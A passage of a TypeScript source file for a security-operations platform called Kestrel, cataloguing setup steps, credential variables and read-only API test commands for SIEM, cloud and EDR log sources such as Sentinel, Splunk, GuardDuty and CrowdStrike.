// ─────────────────────────────────────────────────────────────────────────────
// Kestrel SOC Platform — Sources Catalog
// Full integration definitions for all 29 supported log sources.
// ─────────────────────────────────────────────────────────────────────────────

export type SourceType =
  | 'SIEM'
  | 'Cloud'
  | 'EDR'
  | 'Identity'
  | 'Network'
  | 'Email'
  | 'Enrichment'
  | 'IDS/IPS'
  | 'OS'
  | 'Vulnerability'

export interface SetupStep {
  title: string
  /** May contain inline backtick code snippets */
  body: string
}

export interface EnvKey {
  key: string
  label: string
  sensitive: boolean
  hint: string
}

export interface SourceEntry {
  id: string
  name: string
  vendor: string
  type: SourceType
  /** true = push-based (agent/forwarder sends to Kestrel ingest endpoint) */
  push: boolean
  description: string
  logoColor: string
  logoBg: string
  overview: string
  prerequisites: string[]
  setupSteps: SetupStep[]
  /** Empty array for push-based sources */
  envKeys: EnvKey[]
  testCommand?: string
  /** JSON sample for push sources */
  examplePayload?: string
  helpTags: string[]
}

// ─────────────────────────────────────────────────────────────────────────────
// Catalog
// ─────────────────────────────────────────────────────────────────────────────

export const SOURCE_CATALOG: SourceEntry[] = [
  // ── 1. Microsoft Sentinel ────────────────────────────────────────────────
  {
    id: 'sentinel',
    name: 'Microsoft Sentinel',
    vendor: 'Microsoft',
    type: 'SIEM',
    push: false,
    description: 'Cloud-native SIEM and SOAR from Microsoft Azure.',
    logoColor: '#0078d4',
    logoBg: '#e6f2fb',
    overview:
      'Microsoft Sentinel is a scalable, cloud-native SIEM and SOAR solution built on Azure. ' +
      'Kestrel connects via the Azure Monitor Logs (Log Analytics) REST API to pull SecurityAlert and SecurityIncident records, ' +
      'normalises them to the Kestrel alert schema, and enriches them with MITRE ATT&CK mappings automatically.',
    prerequisites: [
      'Azure subscription with Microsoft Sentinel enabled on a Log Analytics workspace',
      'Service principal (app registration) with the Log Analytics Reader role on the workspace',
      'Tenant ID, client ID, and client secret for the service principal',
      'Log Analytics workspace ID',
      'Network access from the Kestrel host to management.azure.com and api.loganalytics.io',
    ],
    setupSteps: [
      {
        title: 'Register an Azure AD application',
        body:
          'In the Azure portal navigate to Azure Active Directory → App registrations → New registration. ' +
          'Name the app (e.g. `kestrel-sentinel`), leave the redirect URI blank, and click Register. ' +
          'Copy the Application (client) ID and Directory (tenant) ID from the Overview blade.',
      },
      {
        title: 'Create a client secret',
        body:
          'Under the app registration go to Certificates & secrets → New client secret. ' +
          'Set an expiry (12 or 24 months recommended), click Add, and immediately copy the secret Value — ' +
          'it will not be shown again.',
      },
      {
        title: 'Grant Log Analytics Reader role',
        body:
          'Navigate to your Log Analytics workspace → Access control (IAM) → Add role assignment. ' +
          'Select the built-in role `Log Analytics Reader`, then assign it to the service principal created above. ' +
          'This grants read-only query access to the workspace.',
      },
      {
        title: 'Note your workspace ID',
        body:
          'In the Log Analytics workspace Overview blade copy the Workspace ID (a UUID). ' +
          'This is distinct from the workspace name and is required by the Kestrel connector.',
      },
      {
        title: 'Configure Kestrel environment variables',
        body:
          'Set the following variables in your Kestrel `.env` file or deployment environment:\n' +
          '`AZURE_TENANT_ID`, `AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, `AZURE_WORKSPACE_ID`.\n' +
          'Restart the Kestrel collector service after saving.',
      },
      {
        title: 'Verify the connection',
        body:
          'Run the test command below. A successful response returns a JSON object with a `tables` array. ' +
          'Kestrel will begin pulling alerts on the next scheduled sync (default: every 5 minutes).',
      },
    ],
    envKeys: [
      { key: 'AZURE_TENANT_ID', label: 'Azure Tenant ID', sensitive: false, hint: 'Azure AD → App registration → Overview → Directory (tenant) ID' },
      { key: 'AZURE_CLIENT_ID', label: 'Azure Client ID', sensitive: false, hint: 'Azure AD → App registration → Overview → Application (client) ID' },
      { key: 'AZURE_CLIENT_SECRET', label: 'Azure Client Secret', sensitive: true, hint: 'Azure AD → App registration → Certificates & secrets → client secret Value' },
      { key: 'AZURE_WORKSPACE_ID', label: 'Log Analytics Workspace ID', sensitive: false, hint: 'Log Analytics workspace → Overview → Workspace ID' },
    ],
    testCommand:
      'curl -s -X POST \\\n' +
      '  "https://api.loganalytics.io/v1/workspaces/$AZURE_WORKSPACE_ID/query" \\\n' +
      '  -H "Authorization: Bearer $(curl -s -X POST \\\n' +
      '      https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token \\\n' +
      '      -d client_id=$AZURE_CLIENT_ID \\\n' +
      '      -d client_secret=$AZURE_CLIENT_SECRET \\\n' +
      '      -d grant_type=client_credentials \\\n' +
      '      -d scope=https://api.loganalytics.io/.default \\\n' +
      '      | jq -r .access_token)" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  -d \'{"query":"SecurityAlert | limit 1"}\' | jq .',
    helpTags: ['sentinel', 'microsoft', 'azure', 'siem', 'log analytics', 'cloud', 'security alerts', 'workspace'],
  },

  // ── 2. Splunk Enterprise ─────────────────────────────────────────────────
  {
    id: 'splunk',
    name: 'Splunk Enterprise',
    vendor: 'Splunk',
    type: 'SIEM',
    push: false,
    description: 'Industry-leading SIEM and log aggregation platform.',
    logoColor: '#ef4a22',
    logoBg: '#fdf0ed',
    overview:
      'Splunk Enterprise is one of the most widely deployed SIEMs, offering powerful search and correlation across ' +
      'massive log volumes. Kestrel uses the Splunk REST API to execute scheduled saved searches and pull notable events ' +
      'from Enterprise Security (ES) or raw index queries, converting them into normalised Kestrel alerts.',
    prerequisites: [
      'Splunk Enterprise or Splunk Cloud instance (version 8.x or later)',
      'Splunk user account with the `can_delete` capability disabled and at minimum `search` and `list_search_jobs` roles',
      'REST API access on port 8089 (or custom management port)',
      'If using Splunk Enterprise Security: ES app installed and configured',
      'Network connectivity from Kestrel host to the Splunk management port',
    ],
    setupSteps: [
      {
        title: 'Create a dedicated Splunk service account',
        body:
          'In Splunk go to Settings → Users and Authentication → Users → New User. ' +
          'Create a user (e.g. `kestrel-svc`) with the built-in `power` role, or create a custom role ' +
          'with permissions: `search`, `list_search_jobs`, `get_typeahead`, and `edit_own_objects`.',
      },
      {
        title: 'Generate an API token (recommended)',
        body:
          'In Splunk Web navigate to Settings → Users → Token Management → New Token. ' +
          'Assign the token to the `kestrel-svc` user, set an expiry, and copy the token value. ' +
          'Token-based auth is preferred over username/password.',
      },
      {
        title: 'Note the Splunk host and port',
        body:
          'The Kestrel connector uses the Splunk REST API on the management port (default `8089`). ' +
          'Ensure the Kestrel host can reach `https://<splunk-host>:8089`. ' +
          'If TLS certificates are self-signed, set `SPLUNK_VERIFY_SSL=false` (not recommended for production).',
      },
      {
        title: 'Configure a saved search for notable events',
        body:
          'Kestrel will run the SPL query defined in `SPLUNK_QUERY`. A recommended starting query for ES is:\n' +
          '`index=notable earliest=-5m | head 1000`\n' +
          'For non-ES deployments use:\n' +
          '`index=main sourcetype=syslog earliest=-5m severity!=low | head 1000`',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `SPLUNK_HOST`, `SPLUNK_PORT`, `SPLUNK_TOKEN` (or `SPLUNK_USERNAME` + `SPLUNK_PASSWORD`), ' +
          'and optionally `SPLUNK_QUERY` to your Kestrel `.env` file. Restart the collector.',
      },
      {
        title: 'Test the REST API',
        body:
          'Run the test command below. A `200 OK` response with a results array confirms connectivity. ' +
          'The Kestrel UI will show the source as Active after the first successful pull.',
      },
    ],
    envKeys: [
      { key: 'SPLUNK_HOST', label: 'Splunk Host', sensitive: false, hint: 'Hostname or IP of the Splunk management interface' },
      { key: 'SPLUNK_PORT', label: 'Splunk Management Port', sensitive: false, hint: 'Default is 8089' },
      { key: 'SPLUNK_TOKEN', label: 'Splunk API Token', sensitive: true, hint: 'Settings → Users → Token Management → token value' },
      { key: 'SPLUNK_QUERY', label: 'SPL Query', sensitive: false, hint: 'The search query Kestrel runs to fetch events, e.g. index=notable earliest=-5m' },
    ],
    testCommand:
      'curl -k -s \\\n' +
      '  -H "Authorization: Bearer $SPLUNK_TOKEN" \\\n' +
      '  "https://$SPLUNK_HOST:$SPLUNK_PORT/services/search/jobs/export?search=search+index%3Dmain+%7C+head+1&output_mode=json" | jq .',
    helpTags: ['splunk', 'siem', 'enterprise security', 'es', 'notable events', 'spl', 'log aggregation', 'on-premises'],
  },

  // ── 3. IBM QRadar ────────────────────────────────────────────────────────
  {
    id: 'qradar',
    name: 'IBM QRadar',
    vendor: 'IBM',
    type: 'SIEM',
    push: false,
    description: 'Enterprise SIEM platform from IBM Security.',
    logoColor: '#1f70c1',
    logoBg: '#e8f1fb',
    overview:
      'IBM QRadar is an enterprise SIEM that correlates log and network flow data to detect threats. ' +
      'Kestrel integrates via the QRadar REST API v12+ to pull offenses (correlated incidents) and their ' +
      'contributing events, mapping QRadar offense categories to MITRE ATT&CK techniques.',
    prerequisites: [
      'IBM QRadar 7.4 or later (on-premises or QRadar on Cloud)',
      'QRadar user with the Security Administrator role, or a custom role with "View offense data" and "View log activity" capabilities',
      'QRadar REST API enabled (enabled by default on port 443)',
      'API token generated in the QRadar admin console',
      'Network access from Kestrel host to the QRadar console on HTTPS',
    ],
    setupSteps: [
      {
        title: 'Create a QRadar API token',
        body:
          'Log into the QRadar console as an administrator. Navigate to Admin → Authorized Services → Add Authorized Service. ' +
          'Name the service (e.g. `kestrel`), assign a security profile, set the token expiry, and click Create. ' +
          'Copy the generated token — it will not be shown again.',
      },
      {
        title: 'Identify the QRadar console hostname',
        body:
          'The QRadar REST API base URL is `https://<qradar-console>/api`. ' +
          'Verify you can reach it: `curl -k https://<qradar-console>/api/help/versions`.',
      },
      {
        title: 'Configure offense filter (optional)',
        body:
          'By default Kestrel pulls all open offenses. To filter by status or magnitude set `QRADAR_FILTER` ' +
          'to a QRadar API filter string, e.g. `status=OPEN AND magnitude>3`.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `QRADAR_HOST`, `QRADAR_TOKEN`, and optionally `QRADAR_FILTER` and `QRADAR_VERIFY_SSL` ' +
          'to your Kestrel `.env` file. Restart the collector service.',
      },
      {
        title: 'Verify connectivity',
        body:
          'Run the test command below. A successful response is a JSON array of offense objects. ' +
          'The Kestrel source card will update to Active after the first successful sync.',
      },
    ],
    envKeys: [
      { key: 'QRADAR_HOST', label: 'QRadar Console Host', sensitive: false, hint: 'Hostname or IP of the QRadar console (no trailing slash)' },
      { key: 'QRADAR_TOKEN', label: 'QRadar API Token', sensitive: true, hint: 'Admin → Authorized Services → token value' },
      { key: 'QRADAR_FILTER', label: 'Offense Filter', sensitive: false, hint: 'Optional QRadar filter string e.g. status=OPEN AND magnitude>3' },
    ],
    testCommand:
      'curl -k -s \\\n' +
      '  -H "SEC: $QRADAR_TOKEN" \\\n' +
      '  -H "Accept: application/json" \\\n' +
      '  "https://$QRADAR_HOST/api/siem/offenses?filter=status%3DOPEN&range=0-4" | jq .',
    helpTags: ['qradar', 'ibm', 'siem', 'offenses', 'log activity', 'network flows', 'enterprise', 'on-premises'],
  },

  // ── 4. Elastic SIEM ──────────────────────────────────────────────────────
  {
    id: 'elastic-siem',
    name: 'Elastic SIEM',
    vendor: 'Elastic',
    type: 'SIEM',
    push: false,
    description: 'Open-source SIEM built on the Elastic Stack (ELK).',
    logoColor: '#f0bf1a',
    logoBg: '#fdf9e6',
    overview:
      'Elastic SIEM (part of the Elastic Security solution) provides detection rules and alerting on top of Elasticsearch. ' +
      'Kestrel queries the Elasticsearch Detection Engine API to pull rule-triggered alerts from the `.alerts-security.alerts-*` index, ' +
      'normalising ECS fields to the Kestrel alert schema and extracting MITRE ATT&CK metadata from rule tags.',
    prerequisites: [
      'Elasticsearch cluster version 7.14 or later with the Security solution enabled',
      'Kibana with Elastic Security app configured and at least one detection rule active',
      'Elasticsearch user with the `kibana_system` role or a custom role with read access to `.alerts-security.alerts-*`',
      'Elasticsearch REST API accessible from the Kestrel host (port 9200 or 443 for Elastic Cloud)',
      'API key with cluster and index read privileges',
    ],
    setupSteps: [
      {
        title: 'Create an Elasticsearch API key',
        body:
          'In Kibana navigate to Stack Management → API Keys → Create API key. ' +
          'Name it `kestrel-elastic`, restrict index access to `.alerts-security.alerts-*` with `read` privilege, ' +
          'and click Create. Copy both the `id` and `api_key` values — combine them as `id:api_key` in Base64 for the header.',
      },
      {
        title: 'Note Elasticsearch host and port',
        body:
          'For self-hosted: typically `https://<es-host>:9200`. ' +
          'For Elastic Cloud: use the Cloud endpoint from the deployment overview, e.g. `https://<deployment-id>.es.<region>.aws.elastic-cloud.com:9243`.',
      },
      {
        title: 'Confirm the alerts index exists',
        body:
          'Run: `curl -s -H "Authorization: ApiKey <encoded>" https://<es-host>:9200/.alerts-security.alerts-default/_count`\n' +
          'A response with a `count` field confirms the index is present and accessible.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `ELASTIC_HOST`, `ELASTIC_API_KEY` (in `id:api_key` format), and optionally `ELASTIC_INDEX` ' +
          '(defaults to `.alerts-security.alerts-default`) to your Kestrel `.env` file.',
      },
      {
        title: 'Restart and verify',
        body:
          'Restart the Kestrel collector. On the next 5-minute sync cycle, alerts from Elastic SIEM will appear ' +
          'in the Kestrel alert list. Run the test command below to validate manually.',
      },
    ],
    envKeys: [
      { key: 'ELASTIC_HOST', label: 'Elasticsearch Host URL', sensitive: false, hint: 'Full base URL including protocol and port, e.g. https://localhost:9200' },
      { key: 'ELASTIC_API_KEY', label: 'Elasticsearch API Key', sensitive: true, hint: 'Kibana → Stack Management → API Keys → id:api_key combined' },
      { key: 'ELASTIC_INDEX', label: 'Alerts Index', sensitive: false, hint: 'Default: .alerts-security.alerts-default — change for multi-space deployments' },
    ],
    testCommand:
      'curl -s \\\n' +
      '  -H "Authorization: ApiKey $ELASTIC_API_KEY" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  "$ELASTIC_HOST/.alerts-security.alerts-default/_search?size=1" | jq .hits.total',
    helpTags: ['elastic', 'elasticsearch', 'elk', 'kibana', 'siem', 'detection rules', 'ecs', 'open source'],
  },

  // ── 5. AWS GuardDuty ─────────────────────────────────────────────────────
  {
    id: 'guardduty',
    name: 'AWS GuardDuty',
    vendor: 'Amazon Web Services',
    type: 'Cloud',
    push: false,
    description: 'AWS managed threat detection service using ML and threat intelligence.',
    logoColor: '#ff9900',
    logoBg: '#fff6e6',
    overview:
      'AWS GuardDuty is a managed threat detection service that continuously monitors AWS accounts for malicious activity ' +
      'using machine learning, anomaly detection, and integrated threat intelligence. ' +
      'Kestrel polls the GuardDuty ListFindings and GetFindings APIs to import findings, ' +
      'mapping GuardDuty finding types to MITRE ATT&CK and scoring by finding severity.',
    prerequisites: [
      'AWS account with GuardDuty enabled in one or more regions',
      'IAM user or role with the `AmazonGuardDutyReadOnlyAccess` managed policy',
      'AWS access key ID and secret access key for the IAM user (or IAM role if running on EC2/ECS/Lambda)',
      'GuardDuty detector ID for each region you want to pull from',
      'Network access to AWS API endpoints (aws.amazon.com)',
    ],
    setupSteps: [
      {
        title: 'Enable GuardDuty',
        body:
          'In the AWS console navigate to GuardDuty → Get started → Enable GuardDuty. ' +
          'Repeat for each AWS region you want to monitor. Note the Detector ID shown on the GuardDuty overview page — ' +
          'it is unique per account per region.',
      },
      {
        title: 'Create an IAM user for Kestrel',
        body:
          'In IAM → Users → Add users create a user (e.g. `kestrel-guardduty`) with programmatic access. ' +
          'Attach the `AmazonGuardDutyReadOnlyAccess` managed policy. ' +
          'Download the access key CSV — the secret is only shown once.',
      },
      {
        title: 'Note your Detector ID',
        body:
          'In the GuardDuty console the Detector ID appears on the Settings page. ' +
          'If you monitor multiple regions, run:\n' +
          '`aws guardduty list-detectors --region us-east-1`\n' +
          'for each region and store each ID.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_REGION`, and `GUARDDUTY_DETECTOR_ID` ' +
          'to your Kestrel `.env`. For multiple regions, repeat the source configuration.',
      },
      {
        title: 'Test the API connection',
        body:
          'Run the test command below using the AWS CLI. A JSON list of finding IDs confirms access is working.',
      },
    ],
    envKeys: [
      { key: 'AWS_ACCESS_KEY_ID', label: 'AWS Access Key ID', sensitive: false, hint: 'IAM → Users → Security credentials → Access keys' },
      { key: 'AWS_SECRET_ACCESS_KEY', label: 'AWS Secret Access Key', sensitive: true, hint: 'Shown only when the access key is first created — download the CSV' },
      { key: 'AWS_REGION', label: 'AWS Region', sensitive: false, hint: 'e.g. us-east-1, eu-west-1 — the region where GuardDuty is enabled' },
      { key: 'GUARDDUTY_DETECTOR_ID', label: 'GuardDuty Detector ID', sensitive: false, hint: 'GuardDuty console → Settings → Detector ID' },
    ],
    testCommand:
      'aws guardduty list-findings \\\n' +
      '  --detector-id $GUARDDUTY_DETECTOR_ID \\\n' +
      '  --region $AWS_REGION \\\n' +
      '  --finding-criteria \'{"Criterion":{"severity":{"Gte":4}}}\' \\\n' +
      '  --output json | jq .FindingIds[:3]',
    helpTags: ['aws', 'guardduty', 'cloud', 'threat detection', 'iam', 'amazon', 'findings', 'ml'],
  },

  // ── 6. Microsoft Defender for Cloud ──────────────────────────────────────
  {
    id: 'azure-defender',
    name: 'Microsoft Defender for Cloud',
    vendor: 'Microsoft',
    type: 'Cloud',
    push: false,
    description: 'Cloud security posture management and workload protection from Microsoft.',
    logoColor: '#0078d4',
    logoBg: '#e6f2fb',
    overview:
      'Microsoft Defender for Cloud (formerly Azure Security Center) provides unified security management and ' +
      'advanced threat protection across Azure, multi-cloud, and on-premises workloads. ' +
      'Kestrel pulls security alerts via the Microsoft Defender for Cloud REST API, normalising alert properties ' +
      'and mapping alert types to MITRE ATT&CK.',
    prerequisites: [
      'Azure subscription with Microsoft Defender for Cloud (Standard/Defender plans) enabled',
      'Service principal with the Security Reader role on the subscription',
      'Azure subscription ID',
      'Tenant ID, client ID, and client secret for the service principal',
      'Defender for Cloud alerts present (Standard plan required for advanced alerts)',
    ],
    setupSteps: [
      {
        title: 'Enable Defender for Cloud plans',
        body:
          'In the Azure portal navigate to Microsoft Defender for Cloud → Environment settings → select your subscription. ' +
          'Enable Defender plans for the workload types you want to protect (Servers, Storage, SQL, etc.).',
      },
      {
        title: 'Create a service principal',
        body:
          'Go to Azure AD → App registrations → New registration. Name it `kestrel-defender`. ' +
          'Under Certificates & secrets create a client secret and copy the value.',
      },
      {
        title: 'Assign Security Reader role',
        body:
          'Navigate to your subscription → Access control (IAM) → Add role assignment. ' +
          'Select `Security Reader` and assign it to the `kestrel-defender` app registration.',
      },
      {
        title: 'Note your subscription ID',
        body:
          'Find your subscription ID in the Azure portal under Subscriptions. ' +
          'It is a UUID in the format `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`.',
      },
      {
        title: 'Configure Kestrel environment variables',
        body:
          'Add `AZURE_TENANT_ID`, `AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, and `AZURE_SUBSCRIPTION_ID` ' +
          'to your Kestrel `.env`. These credentials may be shared with the Sentinel integration ' +
          'if the same service principal is used.',
      },
      {
        title: 'Verify and activate',
        body:
          'Run the test command. A JSON array of alert objects confirms the connection. ' +
          'Kestrel will sync Defender for Cloud alerts every 5 minutes.',
      },
    ],
    envKeys: [
      { key: 'AZURE_TENANT_ID', label: 'Azure Tenant ID', sensitive: false, hint: 'Azure AD → Overview → Tenant ID' },
      { key: 'AZURE_CLIENT_ID', label: 'Azure Client ID', sensitive: false, hint: 'App registration → Overview → Application (client) ID' },
      { key: 'AZURE_CLIENT_SECRET', label: 'Azure Client Secret', sensitive: true, hint: 'App registration → Certificates & secrets → Value' },
      { key: 'AZURE_SUBSCRIPTION_ID', label: 'Azure Subscription ID', sensitive: false, hint: 'Azure portal → Subscriptions → Subscription ID' },
    ],
    testCommand:
      'TOKEN=$(curl -s -X POST \\\n' +
      '  "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \\\n' +
      '  -d "client_id=$AZURE_CLIENT_ID&client_secret=$AZURE_CLIENT_SECRET&grant_type=client_credentials&scope=https://management.azure.com/.default" \\\n' +
      '  | jq -r .access_token)\n\n' +
      'curl -s \\\n' +
      '  -H "Authorization: Bearer $TOKEN" \\\n' +
      '  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.Security/alerts?api-version=2022-01-01" \\\n' +
      '  | jq .value[:2]',
    helpTags: ['microsoft', 'azure', 'defender', 'cloud', 'security center', 'cspm', 'cwpp', 'workload protection'],
  },

  // ── 7. GCP Security Command Center ───────────────────────────────────────
  {
    id: 'gcp-scc',
    name: 'GCP Security Command Center',
    vendor: 'Google Cloud',
    type: 'Cloud',
    push: false,
    description: "Google Cloud's native security and risk platform.",
    logoColor: '#4285f4',
    logoBg: '#eaf0fe',
    overview:
      'Google Cloud Security Command Center (SCC) provides centralised visibility into your GCP security posture, ' +
      'detecting misconfigurations, vulnerabilities, and threats across GCP assets. ' +
      'Kestrel uses the SCC Findings API v1 with a service account to pull active findings, ' +
      'filtering by finding state and category, and maps them to MITRE ATT&CK.',
    prerequisites: [
      'GCP organisation with Security Command Center Standard or Premium tier enabled',
      'GCP service account with the `Security Center Findings Viewer` IAM role at the organisation level',
      'Service account JSON key file downloaded',
      'GCP Organisation ID',
      'Security Command Center API enabled in the project hosting the service account',
    ],
    setupSteps: [
      {
        title: 'Enable Security Command Center',
        body:
          'In the GCP console navigate to Security → Security Command Center. ' +
          'Select your organisation and activate the service (Standard tier is free; Premium adds threat detection).',
      },
      {
        title: 'Create a service account',
        body:
          'In IAM & Admin → Service Accounts → Create service account. ' +
          'Name it `kestrel-scc`, skip role assignment here, and create the account. ' +
          'Then create and download a JSON key under the Keys tab.',
      },
      {
        title: 'Grant organisation-level IAM role',
        body:
          'Navigate to IAM & Admin → IAM at the organisation level (not project level). ' +
          'Click Grant Access, add the service account email, and assign `Security Center Findings Viewer`. ' +
          'Organisation-level access is required to see findings across all projects.',
      },
      {
        title: 'Note your Organisation ID',
        body:
          'Run `gcloud organizations list` or find the org ID in the GCP console resource selector at the top. ' +
          'The org ID is a numeric string (e.g. `123456789012`).',
      },
      {
        title: 'Configure Kestrel environment variables',
        body:
          'Set `GCP_ORG_ID` and `GCP_SERVICE_ACCOUNT_KEY` (the full path to the JSON key file, or the JSON content as a string) ' +
          'in your Kestrel `.env` file.',
      },
      {
        title: 'Enable the SCC API and test',
        body:
          'Run `gcloud services enable securitycenter.googleapis.com --project=<your-project>`. ' +
          'Then run the test command to list findings. A JSON response confirms the integration is ready.',
      },
    ],
    envKeys: [
      { key: 'GCP_ORG_ID', label: 'GCP Organisation ID', sensitive: false, hint: 'gcloud organizations list — numeric ID' },
      { key: 'GCP_SERVICE_ACCOUNT_KEY', label: 'Service Account JSON Key Path', sensitive: true, hint: 'Full path to the downloaded JSON key file, or the JSON content itself' },
    ],
    testCommand:
      'gcloud scc findings list organizations/$GCP_ORG_ID \\\n' +
      '  --filter="state=ACTIVE" \\\n' +
      '  --format=json \\\n' +
      '  --limit=2',
    helpTags: ['gcp', 'google cloud', 'security command center', 'scc', 'cloud', 'findings', 'organisation', 'cspm'],
  },

  // ── 8. AWS CloudTrail ─────────────────────────────────────────────────────
  {
    id: 'aws-cloudtrail',
    name: 'AWS CloudTrail',
    vendor: 'Amazon Web Services',
    type: 'Cloud',
    push: false,
    description: 'AWS API audit log service for governance, compliance, and security.',
    logoColor: '#ff9900',
    logoBg: '#fff6e6',
    overview:
      'AWS CloudTrail records all API calls made to AWS services, providing a comprehensive audit trail for your AWS environment. ' +
      'Kestrel queries CloudTrail via the LookupEvents API and optionally S3 event log files to detect ' +
      'suspicious API activity — such as unauthorized access attempts, privilege escalation, and data exfiltration patterns — ' +
      'and converts them into Kestrel alerts with MITRE mappings.',
    prerequisites: [
      'AWS CloudTrail enabled with a trail configured (management events at minimum)',
      'IAM user or role with `cloudtrail:LookupEvents` and optionally `s3:GetObject` on the CloudTrail S3 bucket',
      'AWS access key ID and secret access key',
      'CloudTrail trail name and AWS region',
    ],
    setupSteps: [
      {
        title: 'Enable CloudTrail',
        body:
          'In the AWS console navigate to CloudTrail → Trails → Create trail. ' +
          'Enable Management events (read/write) and optionally Data events for S3/Lambda. ' +
          'Configure an S3 bucket for log storage and enable CloudWatch Logs integration if desired.',
      },
      {
        title: 'Create IAM credentials',
        body:
          'Create an IAM user (e.g. `kestrel-cloudtrail`) with programmatic access. ' +
          'Attach a policy that includes `cloudtrail:LookupEvents`. ' +
          'A minimal inline policy:\n' +
          '`{ "Effect": "Allow", "Action": ["cloudtrail:LookupEvents"], "Resource": "*" }`',
      },
      {
        title: 'Configure Kestrel environment variables',
        body:
          'Add `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_REGION`, and `CLOUDTRAIL_TRAIL_NAME` ' +
          'to your Kestrel `.env` file.',
      },
      {
        title: 'Test the API',
        body:
          'Run the test command to confirm LookupEvents returns recent API activity. ' +
          'Kestrel processes CloudTrail events in 5-minute batches and alerts on suspicious patterns.',
      },
    ],
    envKeys: [
      { key: 'AWS_ACCESS_KEY_ID', label: 'AWS Access Key ID', sensitive: false, hint: 'IAM → Users → Security credentials → Access keys' },
      { key: 'AWS_SECRET_ACCESS_KEY', label: 'AWS Secret Access Key', sensitive: true, hint: 'Shown only when the access key is first created' },
      { key: 'AWS_REGION', label: 'AWS Region', sensitive: false, hint: 'Region where the CloudTrail trail is configured, e.g. us-east-1' },
      { key: 'CLOUDTRAIL_TRAIL_NAME', label: 'Trail Name', sensitive: false, hint: 'CloudTrail → Trails — the name of the trail to monitor' },
    ],
    testCommand:
      'aws cloudtrail lookup-events \\\n' +
      '  --region $AWS_REGION \\\n' +
      '  --max-results 2 \\\n' +
      '  --output json | jq .Events[:2]',
    helpTags: ['aws', 'cloudtrail', 'audit log', 'api calls', 'cloud', 'governance', 'compliance', 'amazon'],
  },

  // ── 9. CrowdStrike Falcon ─────────────────────────────────────────────────
  {
    id: 'crowdstrike',
    name: 'CrowdStrike Falcon',
    vendor: 'CrowdStrike',
    type: 'EDR',
    push: false,
    description: 'Cloud-native endpoint detection and response platform.',
    logoColor: '#e3001b',
    logoBg: '#fce6e8',
    overview:
      'CrowdStrike Falcon is a leading cloud-native EDR platform providing real-time endpoint visibility and threat detection. ' +
      'Kestrel integrates via the Falcon Alerts API (formerly Detections API) to pull EDR detections, ' +
      'including process trees, tactics, and affected hosts, converting them to Kestrel alerts with full MITRE ATT&CK attribution.',
    prerequisites: [
      'CrowdStrike Falcon subscription (Prevent, Insight, or higher)',
      'Falcon API client with the `Alerts: Read` and `Hosts: Read` scopes',
      'Falcon API client ID and client secret',
      'CrowdStrike API base URL for your cloud (US-1, US-2, EU-1, US-GOV-1)',
    ],
    setupSteps: [
      {
        title: 'Create a Falcon API client',
        body:
          'Log into the Falcon console → Support and resources → API clients and keys → Create API client. ' +
          'Name it `kestrel`, enable scopes: `Alerts: Read` and `Hosts: Read`. ' +
          'Copy the client ID and client secret — the secret is shown only once.',
      },
      {
        title: 'Identify your cloud region base URL',
        body:
          'US-1 (default): `https://api.crowdstrike.com`\n' +
          'US-2: `https://api.us-2.crowdstrike.com`\n' +
          'EU-1: `https://api.eu-1.crowdstrike.com`\n' +
          'US-GOV-1: `https://api.laggar.gcw.crowdstrike.com`',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `CROWDSTRIKE_CLIENT_ID`, `CROWDSTRIKE_CLIENT_SECRET`, and `CROWDSTRIKE_BASE_URL` ' +
          'to your Kestrel `.env` file.',
      },
      {
        title: 'Verify the OAuth2 token endpoint',
        body:
          'Run the test command to obtain an access token and list recent detections. ' +
          'A `200 OK` with a resources array confirms integration is working.',
      },
    ],
    envKeys: [
      { key: 'CROWDSTRIKE_CLIENT_ID', label: 'Falcon API Client ID', sensitive: false, hint: 'Falcon console → Support → API clients and keys → Client ID' },
      { key: 'CROWDSTRIKE_CLIENT_SECRET', label: 'Falcon API Client Secret', sensitive: true, hint: 'Shown only when the API client is first created' },
      { key: 'CROWDSTRIKE_BASE_URL', label: 'Falcon API Base URL', sensitive: false, hint: 'e.g. https://api.crowdstrike.com (US-1 default)' },
    ],
    testCommand:
      'TOKEN=$(curl -s -X POST "$CROWDSTRIKE_BASE_URL/oauth2/token" \\\n' +
      '  -H "Content-Type: application/x-www-form-urlencoded" \\\n' +
      '  -d "client_id=$CROWDSTRIKE_CLIENT_ID&client_secret=$CROWDSTRIKE_CLIENT_SECRET" \\\n' +
      '  | jq -r .access_token)\n\n' +
      'curl -s \\\n' +
      '  -H "Authorization: Bearer $TOKEN" \\\n' +
      '  "$CROWDSTRIKE_BASE_URL/alerts/queries/alerts/v2?limit=2" | jq .',
    helpTags: ['crowdstrike', 'falcon', 'edr', 'endpoint', 'detection', 'cloud-native', 'process tree', 'mitre'],
  },

  // ── 10. SentinelOne ──────────────────────────────────────────────────────
  {
    id: 'sentinelone',
    name: 'SentinelOne',
    vendor: 'SentinelOne',
    type: 'EDR',
    push: false,
    description: 'Autonomous AI-powered endpoint protection and EDR.',
    logoColor: '#6c2bd9',
    logoBg: '#f0ebfd',
    overview:
      'SentinelOne provides AI-driven endpoint protection, EDR, and XDR capabilities through its Singularity platform. ' +
      'Kestrel connects to the SentinelOne Management Console REST API to pull Threats (detections), ' +
      'enriching each alert with endpoint context, MITRE ATT&CK techniques, and kill-chain stage information.',
    prerequisites: [
      'SentinelOne Singularity Complete or Enterprise subscription',
      'Management console URL (e.g. https://your-instance.sentinelone.net)',
      'API token generated from the management console (User Management → Generate API Token)',
      'User account with at minimum the Viewer role for API read access',
    ],
    setupSteps: [
      {
        title: 'Generate an API token',
        body:
          'Log into the SentinelOne management console → click your username (top right) → My User → Generate API Token. ' +
          'Set an expiry and copy the token. Tokens expire and must be renewed.',
      },
      {
